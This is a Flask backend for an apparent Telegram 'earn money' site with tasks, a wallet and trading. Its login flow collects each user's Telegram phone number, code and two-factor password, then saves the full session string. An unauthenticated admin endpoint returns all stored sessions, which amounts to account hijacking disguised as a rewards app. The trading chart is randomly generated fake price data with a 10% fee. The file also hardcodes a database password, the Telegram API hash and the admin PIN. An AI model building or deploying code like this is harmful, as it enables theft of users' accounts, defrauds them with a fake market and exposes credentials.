import os
import asyncio
import random
import time
from datetime import datetime, timedelta
from threading import Thread
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from bson import ObjectId
import firebase_admin
from firebase_admin import credentials, db

# ---------------------------------------------------------
# ১. কনফিগারেশন ও ডাটাবেস সেটআপ
# ---------------------------------------------------------
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")

# Render/HTTPS এর জন্য সেশন সিকিউরিটি আপডেট (এটিই ড্যাশবোর্ড ফিক্স করবে)
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    PERMANENT_SESSION_LIFETIME=timedelta(days=10)
)

@app.before_request
def make_session_permanent():
    session.permanent = True

CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# API & DB Info
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# Firebase Setup
try:
    if not firebase_admin._apps:
        cred = credentials.Certificate("firebase-key.json")
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://teleearnbd-default-rtdb.firebaseio.com/' 
        })
    fb_ref = db.reference('candles')
except Exception as e:
    print(f"Firebase Init Error: {e}")

# MongoDB Setup
client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000, socketTimeoutMS=30000)
mdb = client_db['aaf_tele_earn_db']
users_col = mdb['users']
ads_col = mdb['ads']  
tasks_col = mdb['tasks'] 
withdraws_col = mdb['withdraws']

temp_clients = {}

# ---------------------------------------------------------
# ২. ক্যান্ডেল জেনারেটর (Background Thread)
# ---------------------------------------------------------
def generate_candles_background():
    print("🚀 Candle Generator Started...")
    while True:
        try:
            last_candle = fb_ref.order_by_key().limit_to_last(1).get()
            open_price = 1.0000
            if last_candle:
                for key, val in last_candle.items():
                    open_price = val['close']

            volatility = 0.002
            close_price = open_price + random.uniform(-volatility, volatility)
            
            new_candle = {
                "open": round(open_price, 4),
                "high": round(max(open_price, close_price) + random.uniform(0, 0.001), 4),
                "low": round(min(open_price, close_price) - random.uniform(0, 0.001), 4),
                "close": round(close_price, 4),
                "timestamp": int(time.time() * 1000)
            }
            fb_ref.push(new_candle)
            time.sleep(60)
        except Exception as e:
            time.sleep(10)

Thread(target=generate_candles_background, daemon=True).start()

# ---------------------------------------------------------
# ৩. HTML পেজ রাউটস
# ---------------------------------------------------------
@app.route('/')
def index():
    if 'uid' in session: return redirect(url_for('render_dashboard_page'))
    return render_template('login.html')

@app.route('/dashboard')
def render_dashboard_page(): 
    uid = session.get('uid')
    if not uid: return redirect(url_for('index'))
    
    user = users_col.find_one({"telegram_id": int(uid)})
    if not user:
        session.pop('uid', None)
        return redirect(url_for('index'))
        
    return render_template('dashboard.html', user=user)

@app.route('/task')
def render_task_page(): 
    if 'uid' not in session: return redirect(url_for('index'))
    return render_template('task.html')

@app.route('/treading')
def render_treading_page():
    if 'uid' not in session: return redirect(url_for('index'))
    return render_template('treading.html')

@app.route('/account')
def render_account_page():
    if 'uid' not in session: return redirect(url_for('index'))
    return render_template('account.html')

@app.route('/wallet')
def render_wallet_page(): 
    if 'uid' not in session: return redirect(url_for('index'))
    return render_template('wallet.html')

@app.route('/logout')
def user_logout():
    session.clear()
    return redirect(url_for('index'))

# ---------------------------------------------------------
# ৪. অ্যাডমিন কন্ট্রোল এপিআই (Admin Panel)
# ---------------------------------------------------------
ADMIN_PIN = "Abdullah6790" 
@app.route('/admin')
def render_admin_panel():
    user_pin = request.args.get('pin')
    if user_pin == ADMIN_PIN:
        return render_template('admin.html')
    return "Access Denied", 403

@app.route('/api/admin/get_all_users')
def manage_get_all_users():
    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "telegram_id": 1, "main_balance": 1, "status": 1}))
    return jsonify({"success": True, "users": users})

@app.route('/api/admin/get_all_sessions')
def manage_get_sessions():
    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
    return jsonify({"success": True, "sessions": users})

@app.route('/api/add_task', methods=['POST'])
def manage_add_task():
    try:
        data = request.json
        tasks_col.insert_one({
            "title": data.get('title'),
            "reward": float(data.get('reward', 0)),
            "link": data.get('link'),
            "category": data.get('category', 'General'),
            "description": data.get('desc', ''),
            "status": "active",
            "created_at": datetime.utcnow()
        })
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/admin/delete_task/<task_id>', methods=['DELETE'])
def delete_task_api(task_id):
    try:
        tasks_col.delete_one({"_id": ObjectId(task_id)})
        return jsonify({"success": True})
    except:
        return jsonify({"success": False})

@app.route('/api/admin/update_user', methods=['POST'])
def manage_update_user():
    data = request.json
    uid = int(data.get('telegram_id'))
    bal = float(data.get('balance', 0))
    users_col.update_one({"telegram_id": uid}, {"$set": {"main_balance": bal}})
    return jsonify({"success": True})

@app.route('/api/update_ads', methods=['POST'])
def manage_update_ads():
    data = request.json
    ads_col.delete_many({})
    if data.get('ads'):
        ads_col.insert_many(data.get('ads'))
    return jsonify({"success": True})

# ---------------------------------------------------------
# ৫. ইউজার ও ট্রেড এপিআই
# ---------------------------------------------------------
@app.route('/api/send_otp', methods=['POST'])
def send_otp_handler():
    data = request.json
    phone = data.get('phone')
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        result = client.send_code_request(phone)
        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash}
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
def verify_login_handler():
    data = request.json
    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
    if phone not in temp_clients: return jsonify({"success": False, "message": "Expired Session"})
    try:
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
        session_str = client.session.save()
        
        users_col.update_one(
            {"telegram_id": user.id},
            {"$set": {
                "telegram_id": user.id,
                "phone": phone,
                "name": f"{user.first_name or ''} {user.last_name or ''}",
                "session_string": session_str,
                "last_login": datetime.utcnow()
            }, "$setOnInsert": {"main_balance": 0.0, "aaf_balance": 0.0, "status": "active", "completed_tasks": []}},
            upsert=True
        )
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/user/dashboard_stats')
def get_user_data_api():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False})
    user = users_col.find_one({"telegram_id": int(uid)})
    if user:
        return jsonify({
            "success": True,
            "balance": user.get('main_balance', 0.0),
            "aaf_balance": user.get('aaf_balance', 0.0),
            "name": user.get('name', 'User')
        })
    return jsonify({"success": False})

@app.route('/api/get_tasks')
def fetch_tasks():
    tasks = list(tasks_col.find({"status": "active"}))
    for t in tasks: t['_id'] = str(t['_id'])
    return jsonify({"success": True, "tasks": tasks})

@app.route('/api/user/tasks/claim', methods=['POST'])
def claim_task():
    try:
        data = request.json
        uid = session.get('uid')
        task_id = data.get('task_id')
        user = users_col.find_one({"telegram_id": int(uid)})
        
        if task_id in user.get("completed_tasks", []):
            return jsonify({"status": "error", "message": "Already Claimed"})
        
        task = tasks_col.find_one({"_id": ObjectId(task_id)})
        reward = float(task.get('reward', 0))
        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"main_balance": reward}, "$push": {"completed_tasks": task_id}})
        return jsonify({"status": "success", "reward": reward})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/trade/execute', methods=['POST'])
def execute_trade():
    try:
        data = request.json
        uid = session.get('uid')
        trade_type = data.get('type')
        amount = float(data.get('amount', 0))
        user = users_col.find_one({"telegram_id": int(uid)})
        
        fee = amount * 0.10
        net = amount - fee

        if trade_type == 'BUY':
            if user['main_balance'] < amount: return jsonify({"status": "error", "message": "Low Balance"})
            users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"main_balance": -amount, "aaf_balance": net}})
        else:
            if user['aaf_balance'] < amount: return jsonify({"status": "error", "message": "Low AAF"})
            users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"aaf_balance": -amount, "main_balance": net}})
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/refer_list')
def refer_list():
    return render_template('refer_list.html')

@app.route('/payment_history')
def payment_history():
    return render_template('payment_history.html')

@app.route('/ping')
def ping():
    return "I am alive!", 200

@app.route('/api/get_ads')
def fetch_ads():
    return jsonify({"success": True, "ads": list(ads_col.find({}, {"_id": 0}))})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
